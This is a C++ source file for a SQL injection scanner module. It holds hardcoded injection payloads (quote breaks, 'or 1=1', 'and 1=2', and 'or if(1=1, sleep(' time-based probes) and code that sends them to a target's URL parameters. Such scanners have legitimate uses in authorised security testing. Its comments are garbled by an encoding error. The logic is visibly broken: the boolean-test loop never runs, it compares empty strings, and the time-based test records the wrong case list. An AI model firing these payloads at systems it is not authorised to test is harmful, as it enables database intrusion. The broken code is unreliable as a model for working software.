#include "stdafx.h"
#include "SQLiTest.h"


CSQLiTest::CSQLiTest(CData* pData)
{
	EBCvec = vector<ErrorBasedCase*>();
	TBCvec = vector<TimeBasedCase*>();
	BBCvec = vector<BoolBasedCase*>();
	resultVec = vector<SQLiResult*>();
	m_pData = pData;
	loadConfiguration();
}


CSQLiTest::~CSQLiTest()
{

}

BOOL CSQLiTest::loadConfiguration(string fileName/*="SQLiTestCase.xml"*/)
{
	//��ȡXml�ļ���������
	try
	{
		//����һ��XML���ĵ�����
		TiXmlDocument *myDocument = new TiXmlDocument(fileName.c_str());
		if (!(myDocument->LoadFile()))
		{
			_cprintf("�ļ�������\n");
			WriteLog("SQLiTest LoadConfiguration failed: file noe exist:" + fileName);
		}
		//��ø�Ԫ�أ���Persons��
		TiXmlElement *RootElement = myDocument->RootElement();
		//�����Ԫ�����ƣ������Persons��
		_cprintf("%s\n", RootElement->Value());

		TiXmlElement *EBCRoot = RootElement->FirstChildElement();

		int num = 0;
		EBCRoot->QueryIntAttribute("num", &num);
		PErrorBasedCase pEBC;
		TiXmlElement *caseElement = EBCRoot->FirstChildElement();
		for (int i = 0; i < num; i++){
			pEBC = new ErrorBasedCase();
			caseElement->QueryIntAttribute("id", &(pEBC->id));
			TiXmlElement *injectElement = caseElement->FirstChildElement();
			TiXmlElement *identiEle = injectElement->NextSiblingElement();
			TiXmlElement *checkElement = identiEle->NextSiblingElement();
			pEBC->inject = injectElement->GetText();
			pEBC->identify = identiEle->FirstChild()->Value();
			pEBC->check = checkElement->FirstChild()->Value();
			_cprintf("id:%d\tinject:%s\tidentify:%s\tcheck:%s\n", pEBC->id, pEBC->inject.c_str(), pEBC->identify.c_str(), pEBC->check.c_str());
			EBCvec.push_back(pEBC);
			caseElement = caseElement->NextSiblingElement();
		}

		TiXmlElement *BBCRoot = EBCRoot->NextSiblingElement();

		num = 0;
		BBCRoot->QueryIntAttribute("num", &num);
		PBoolBasedCase pBBC;
		caseElement = BBCRoot->FirstChildElement();
		for (int i = 0; i < num; i++){
			pBBC = new BoolBasedCase();
			caseElement->QueryIntAttribute("id", &(pBBC->id));
			TiXmlElement *injectElement = caseElement->FirstChildElement();
			TiXmlElement *inject2Element = injectElement->NextSiblingElement();
			TiXmlElement *identiEle = inject2Element->NextSiblingElement();
			TiXmlElement *checkElement = identiEle->NextSiblingElement();
			pBBC->inject = injectElement->GetText();
			pBBC->inject2 = inject2Element->FirstChild()->Value();
			pBBC->identify = identiEle->FirstChild()->Value();
			pBBC->check = checkElement->FirstChild()->Value();
			_cprintf("id:%d\tinject:%s\tinject2:%s\tidentify:%s\tcheck:%s\n", pBBC->id, pBBC->inject.c_str(), pBBC->inject2.c_str(), pBBC->identify.c_str(), pBBC->check.c_str());
			BBCvec.push_back(pBBC);
			caseElement = caseElement->NextSiblingElement();
		}

		TiXmlElement *TBCRoot = BBCRoot->NextSiblingElement();

		num = 0;
		TBCRoot->QueryIntAttribute("num", &num);
		PTimeBasedCase pTBC;
		caseElement = TBCRoot->FirstChildElement();
		for (int i = 0; i < num; i++){
			pTBC = new TimeBasedCase();
			caseElement->QueryIntAttribute("id", &(pTBC->id));
			TiXmlElement *injectElement = caseElement->FirstChildElement();
			TiXmlElement *injectPostElement = injectElement->NextSiblingElement();
			TiXmlElement *identiEle = injectPostElement->NextSiblingElement();
			TiXmlElement *identiPostEle= identiEle->NextSiblingElement();
			pTBC->inject = injectElement->FirstChild()->Value();
			pTBC->injectPost = injectPostElement->FirstChild()->Value();
			pTBC->identify = identiEle->FirstChild()->Value();
			pTBC->identifyPost = identiPostEle->FirstChild()->Value();
			_cprintf("id:%d\tinject:%s\tinjectpost:%s\tidentify:%s\tidentifyPost:%s\n" ,
					 pTBC->id, pTBC->inject.c_str(), pTBC->injectPost.c_str(), pTBC->identify.c_str(), pTBC->identifyPost.c_str());
			TBCvec.push_back(pTBC);
			caseElement = caseElement->NextSiblingElement();
		}

		myDocument->SaveFile(fileName.c_str());
	}
	catch (string& e)
	{
		WriteLog("SQLiTest LoadConfiguration failed" + e);
		return false;
	}
	return true;
}

BOOL CSQLiTest::saveConfiguration(string fileName /*= "test.xml"*/)
{
	try
	{
		//����һ��XML���ĵ�����
		TiXmlDocument *myDocument = new TiXmlDocument();
		//����һ����Ԫ�ز����ӡ�
		TiXmlElement *RootElement = new TiXmlElement("SQLiTestCase");
		myDocument->LinkEndChild(RootElement);

		TiXmlElement *EBCRoot = new TiXmlElement("ErrorBasedTestCase");
		RootElement->LinkEndChild(EBCRoot);
		EBCRoot->SetAttribute("num", 0);
		TiXmlElement *BBCRoot = new TiXmlElement("BoolBasedTestCase");
		RootElement->LinkEndChild(BBCRoot);
		BBCRoot->SetAttribute("num", 0);
		TiXmlElement *TBCRoot = new TiXmlElement("TimeBasedTestCase");
		RootElement->LinkEndChild(TBCRoot);
		TBCRoot->SetAttribute("num", 0);


		ErrorBasedCase EBCcase = { 0, "'", "NULL", "You have an error in your SQL syntax;" };
		insertEBC(&EBCcase, EBCRoot);
		ErrorBasedCase EBCcase2 = { 0, "\"", "NULL", "You have an error in your SQL syntax;" };
		insertEBC(&EBCcase2, EBCRoot);
		ErrorBasedCase EBCcase3 = { 0, "___", "NULL", "You have an error in your SQL syntax;" };
		insertEBC(&EBCcase3, EBCRoot);

		BoolBasedCase bbcCase = { 0, "' and 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "\" and 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "') and 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "\") and 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "2 and 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "2) and 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);

		bbcCase = { 0, "' or 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "\" or 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "') or 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "\") or 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "2 or 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "2) or 1=1 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);

		bbcCase = { 0, "' and 1=2 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "\" and 1=2 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "') and 1=2 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "\") and 1=2 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "2 and 1=2 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);
		bbcCase = { 0, "2) and 1=2 ", "NULL", "NULL", "NULL" };
		insertBBC(&bbcCase, BBCRoot);



		TimeBasedCase tbcCase = { 0, "' or if(1=1, sleep(", "), 0) ", "NULL", "NULL", 0 };
		insertTBC(&tbcCase, TBCRoot);
		TimeBasedCase tbcCase2 = { 0, "\" or if(1=1, sleep(", "), 0) ", "NULL", "NULL", 0 };
		insertTBC(&tbcCase2, TBCRoot);
		TimeBasedCase tbcCase3 = { 0, "') or if(1=1, sleep(", "), 0) ", "NULL", "NULL", 0 };
		insertTBC(&tbcCase, TBCRoot);
		TimeBasedCase tbcCase4 = { 0, "\") or if(1=1, sleep(", "), 0) ", "NULL", "NULL", 0 };
		insertTBC(&tbcCase2, TBCRoot);
		TimeBasedCase tbcCase5 = { 0, "23 or if(1=1, sleep(", "), 0) ", "NULL", "NULL", 0 };
		insertTBC(&tbcCase, TBCRoot);
		TimeBasedCase tbcCase6 = { 0, "23) or if(1=1, sleep(", "), 0) ", "NULL", "NULL", 0 };
		insertTBC(&tbcCase2, TBCRoot);

		myDocument->SaveFile(fileName.c_str());//���浽�ļ�
	}
	catch (string& e)
	{
		WriteLog("SQLiTest SaveConfiguration failed" + e);
		return false;
	}
	return true;
}
void CSQLiTest::insertEBC(ErrorBasedCase *pEBC, TiXmlElement *EBCRoot)
{
	int i = -1;
	TiXmlElement *ele = (TiXmlElement*)EBCRoot->LastChild();
	if (ele == NULL)
	{
		i = 0;
	}
	else
	{
		ele->QueryIntAttribute("id", &i);
	}

	pEBC->id = i + 1;

	TiXmlElement *caseElement = new TiXmlElement("case");
	EBCRoot->LinkEndChild(caseElement);
	caseElement->SetAttribute("id", pEBC->id);
	TiXmlElement *injectElement = new TiXmlElement("inject");
	TiXmlElement *identiEle = new TiXmlElement("identify");
	TiXmlElement *checkElement = new TiXmlElement("check");
	caseElement->LinkEndChild(injectElement);
	caseElement->LinkEndChild(identiEle);
	caseElement->LinkEndChild(checkElement);

	TiXmlText *injectText = new TiXmlText(pEBC->inject.c_str());
	TiXmlText *identiText = new TiXmlText(pEBC->identify.c_str());
	TiXmlText *checkText = new TiXmlText(pEBC->check.c_str());
	injectElement->LinkEndChild(injectText);
	identiEle->LinkEndChild(identiText);
	checkElement->LinkEndChild(checkText);

	EBCRoot->QueryIntAttribute("num", &i);
	EBCRoot->SetAttribute("num", i + 1);
}
void CSQLiTest::insertBBC(BoolBasedCase *pBBC, TiXmlElement *BBCRoot)
{
	int i = -1;
	TiXmlElement *ele = (TiXmlElement*)BBCRoot->LastChild();
	if (ele == NULL)
	{
		i = 0;
	}
	else
	{
		ele->QueryIntAttribute("id", &i);
	}

	pBBC->id = i + 1;

	TiXmlElement *caseElement = new TiXmlElement("case");
	BBCRoot->LinkEndChild(caseElement);
	caseElement->SetAttribute("id", pBBC->id);
	TiXmlElement *injectElement = new TiXmlElement("inject");
	TiXmlElement *inject2Element = new TiXmlElement("inject2");
	TiXmlElement *identiEle = new TiXmlElement("identify");
	TiXmlElement *checkElement = new TiXmlElement("check");
	caseElement->LinkEndChild(injectElement);
	caseElement->LinkEndChild(inject2Element);
	caseElement->LinkEndChild(identiEle);
	caseElement->LinkEndChild(checkElement);

	TiXmlText *injectText = new TiXmlText(pBBC->inject.c_str());
	TiXmlText *inject2Text = new TiXmlText(pBBC->inject2.c_str());
	TiXmlText *identiText = new TiXmlText(pBBC->identify.c_str());
	TiXmlText *checkText = new TiXmlText(pBBC->check.c_str());
	injectElement->LinkEndChild(injectText);
	inject2Element->LinkEndChild(inject2Text);
	identiEle->LinkEndChild(identiText);
	checkElement->LinkEndChild(checkText);
	BBCRoot->QueryIntAttribute("num", &i);
	BBCRoot->SetAttribute("num", i + 1);
}
void CSQLiTest::insertTBC(TimeBasedCase *pTBC, TiXmlElement *TBCRoot)
{
	int i = -1;
	TiXmlElement *ele = (TiXmlElement*)TBCRoot->LastChild();
	if (ele == NULL)
	{
		i = 0;
	}
	else
	{
		ele->QueryIntAttribute("id", &i);
	}
	pTBC->id = i + 1;
	TiXmlElement *caseElement = new TiXmlElement("case");
	TBCRoot->LinkEndChild(caseElement);
	caseElement->SetAttribute("id", pTBC->id);
	TiXmlElement *injectElement = new TiXmlElement("inject");
	TiXmlElement *identiEle = new TiXmlElement("identify");
	TiXmlElement *injectPostElement = new TiXmlElement("injectPost");
	TiXmlElement *identiPostEle = new TiXmlElement("identifyPost");
	caseElement->LinkEndChild(injectElement);
	caseElement->LinkEndChild(injectPostElement);
	caseElement->LinkEndChild(identiEle);
	caseElement->LinkEndChild(identiPostEle);

	TiXmlText *injectText = new TiXmlText(pTBC->inject.c_str());
	TiXmlText *identiText = new TiXmlText(pTBC->identify.c_str());
	TiXmlText *injectPostText = new TiXmlText(pTBC->injectPost.c_str());
	TiXmlText *identiPostText = new TiXmlText(pTBC->identifyPost.c_str());
	injectElement->LinkEndChild(injectText);
	identiEle->LinkEndChild(identiText);
	injectPostElement->LinkEndChild(injectPostText);
	identiPostEle->LinkEndChild(identiPostText);

	TBCRoot->QueryIntAttribute("num", &i);
	TBCRoot->SetAttribute("num", i + 1);
}

bool CSQLiTest::test(CHttpClient *pHttpClient, Item *pItem)
{
	if ((pItem->getUrl().find("sqli/") != -1) )
	{
		int x = 1;
	}
	long averageTime1 = 0;
	long averageTime2 = 0;

	for (unsigned i = 0; i < pItem->getArgs().size(); i++)
	{
		if (m_errorBased)
		{
			if (errorBasedTest(pHttpClient, pItem, i, averageTime1))
			{
				continue;
			}
		}
		if (m_boolBased)
		{
			if (boolBasedTest(pHttpClient, pItem, i, averageTime2))
			{
				continue;
			}
		}
		if (m_timeBased)
		{
			if (timeBasedTest(pHttpClient, pItem, i, (averageTime1+averageTime2)/2))
			{
				continue;
			}
		}
	}
	return false;
}

bool CSQLiTest::errorBasedTest(CHttpClient* pHttpClient, Item *pItem, unsigned pos, long &averageTime)
{
	long sumTime = 0;
	int sendCount = 0;

	string html = "";
	Cookie cookie;
	string cookieStr;
	string args = "";
	SQLiResult* pResult = NULL;
	m_pData->getCookie(cookie);
	cookieStr = cookie.toString();
	HttpMethod method = pItem->getMethod();
	string url = pItem->getUrl();

	int resultState = 0;	//1 ��ʾֻ��inject�У�2��ʾ�������С�
	for (unsigned i = 0; i < EBCvec.size(); i++)
	{
		resultState = 0;
		html = "";
		//�������ơ�
		args = pItem->getArgsStr(pos, EBCvec[i]->inject);

		send(pHttpClient, method, cookieStr, url, args, html, sumTime, sendCount);

		if (pHttpClient->getStatusCode() / 100 == 5){
			//������Ϊ�������ڲ���������Ϊ��©����
			resultState++;
		}else if (html.find(EBCvec[i]->check) != -1)
		{
			resultState++;
		}
		//����ҵ��˱���������֤��
		//html = "";
		//if (resultState == 1)
		//{
		//	args = pItem->getArgsStr(i, EBCvec[i]->identify);

		//	send(pHttpClient, method, cookieStr, url, args, html, sumTime);
		//	sendCount++;

		//	if (pHttpClient->getStatusCode() / 100 == 5){
		//		//������Ϊ�������ڲ���������Ϊ��©����
		//		resultState++;
		//	}
		//	else if (html.find(EBCvec[i]->check) != -1)
		//	{
		//		resultState++;
		//	}
		//}

		if (resultState != 0)
		{
			//��¼���
			pResult = new SQLiResult();
			pResult->id = resultVec.size();
			pResult->itemId = pItem->getId();
			pResult->url = pItem->getUrl();
			pResult->caseId = EBCvec[i]->id;
			pResult->injectPos = pos;
			pResult->cookie = cookie.toString();
			pResult->args = pItem->getArgsStr();
			pResult->resultState = resultState;
			pResult->type = 0;
			resultVec.push_back(pResult);
			break;
		}
	}
	averageTime = sumTime / (sendCount * 1000 / CLOCKS_PER_SEC);

	return resultState > 0;
}

bool CSQLiTest::boolBasedTest(CHttpClient* pHttpClient, Item *pItem, unsigned pos, long &averageTime)
{

	long sumTime = 0;
	int sendCount = 0;

	bool isInjectable = false;
	string html = "";
	Cookie cookie;
	string cookieStr;
	string args = "";
	SQLiResult* pResult = NULL;
	m_pData->getCookie(cookie);
	int resultState = 0;	
	cookieStr = cookie.toString();
	HttpMethod method = pItem->getMethod();
	string url = pItem->getUrl();
	unsigned int testCaseNum = BBCvec.size() / 3;
	// and 1=1, or 1=1, and 1=2; �������ͣ�ÿ��������������ͬ��

	string oriHtml;
	string errorHtml;
	string rightHtml;

	if ((pItem->getArgs())[pos].getValue() != "")	//�Ƿ���Ĭ��ֵ
	{
		//��λ����Ĭ��ֵ
		args = pItem->getArgsStr();
		send(pHttpClient, method, cookieStr, url, args, oriHtml, sumTime, sendCount);	//��ȡ����0
		for (unsigned i = 0; i < testCaseNum; i++)
		{
			args = pItem->getArgsStr(pos, BBCvec[i]->inject) + getComment(method);

		}

	}










	args = pItem->getArgsStr();
	for (unsigned i = 0; BBCvec.size() < 1; i++)
	{
		resultState = 0;

		args = pItem->getArgsStr(pos,BBCvec[i]->inject);

		send(pHttpClient, method, cookieStr, url, args, html, sumTime, sendCount);
		sendCount++;

		args = pItem->getArgsStr(pos, BBCvec[i]->inject2);
		send(pHttpClient, method, cookieStr, url, args, html, sumTime, sendCount);

		sendCount++;
		if (!htmlEqual(errorHtml, rightHtml))
		{
			resultState++;
			if (1)
			{
				//��һ��ȷ�ϡ���֪�����ȷ�ϡ�
			//	resultState++;
			}
			if (resultState != 0)
			{
				pResult = new SQLiResult();
				pResult->id = resultVec.size();
				pResult->itemId = pItem->getId();
				pResult->url = pItem->getUrl();
				pResult->caseId = BBCvec[i]->id;
				pResult->injectPos = pos;
				pResult->cookie = cookie.toString();
				pResult->args = pItem->getArgsStr();
				pResult->resultState = resultState;
				pResult->type = 1;
				resultVec.push_back(pResult);
			}
		}
		if (resultState == 2)
			break;
	}

	averageTime = sumTime / (sendCount * 1000 / CLOCKS_PER_SEC);
	return resultState==2;
}

bool CSQLiTest::timeBasedTest(CHttpClient* pHttpClient, Item *pItem, unsigned pos, long averageTime)
{
	clock_t start, end;
	string html = "";
	Cookie cookie;
	string args = "";
	SQLiResult* pResult = NULL;
	m_pData->getCookie(cookie);
	int resultState = 0;	//1 

	CURLcode code;
	pHttpClient->setTimeOut(averageTime + m_lateTime);
	for (unsigned i = 0; i < TBCvec.size(); i++)
	{
		resultState = 0;
		args = pItem->getArgsStr(pos, TBCvec[i]->inject + to_string(averageTime/1000 + 1) + TBCvec[i]->injectPost + getComment(pItem->getMethod()));


		start = clock();
		code = pHttpClient->send(pItem->getMethod(), cookie.toString(), pItem->getUrl(), args, html);
		end = clock();
		switch (code)
		{
			case CURLE_OPERATION_TIMEDOUT:
				//��ʱ��˵��if��������,���ɲ���
				resultState++;
				break;
			case CURLE_OK:
				if ((end - start) > averageTime + m_lateTime)
				{
					//Ҳ˵���ӳ�ʱ�������⡣����ִ�е�sleep����
					resultState++;
				}
				break;
			default:
				WriteLog("timeBasedTest(CHttpClient* pHttpClient, Item *pItem, unsigned pos, long averageTime)----curlCode=" + to_string(code));
				break;
		}
		if (resultState == 1)
		{
			//��һ����֤����֪�������֤��
		}
		if (resultState > 0)
		{
			pResult = new SQLiResult();
			pResult->id = resultVec.size();
			pResult->itemId = pItem->getId();
			pResult->url = pItem->getUrl();
			pResult->caseId = BBCvec[i]->id;
			pResult->injectPos = pos;
			pResult->cookie = cookie.toString();
			pResult->args = pItem->getArgsStr();
			pResult->resultState = resultState;
			pResult->type = 2;
			resultVec.push_back(pResult);
			break;
		}
	}
	pHttpClient->setTimeOut(0);
	return resultState > 0;
}




std::string CSQLiTest::resultToString()
{
	string args = "\n\n----------------showResult(resultId, type, resultState, caseId, url, args,cookie,injectPos)-------------------------------\n";
	for (unsigned i = 0; i < resultVec.size(); i++)
	{
		args += to_string(resultVec[i]->id) +
			"\t" + to_string(resultVec[i]->type) +
			"\t" + to_string(resultVec[i]->resultState) +
			"\t" + to_string(resultVec[i]->caseId) +
			"\t" + resultVec[i]->url +
			"\t" + resultVec[i]->args +
			"\t" + resultVec[i]->cookie +
			"\t" + to_string(resultVec[i]->injectPos) +
			"\n------------------------------index-----------------------------\n";
	}
	return args;
}

BOOL CSQLiTest::htmlEqual(string html, string html2)
{
	if (html == html2)
		return true;
	return false;
}

string CSQLiTest::getComment(HttpMethod method)
{
	string arg;
	if (method == HttpMethod::get)
	{
		arg = "--+";
	}
	else if (method == HttpMethod::post)
	{
		arg = "#";
	}
	return arg;
}

CURLcode CSQLiTest::send(CHttpClient*pHttpClient, HttpMethod method, string cookieStr, string url, string args, string& html, long&sumTime, int&sendCount)
{
	CURLcode code;
	static clock_t start, end;
	start = clock();
	code=pHttpClient->send(method, cookieStr, url, args, html);
	end = clock();
	sumTime += (end - start);
	sendCount++;
	return code;
}



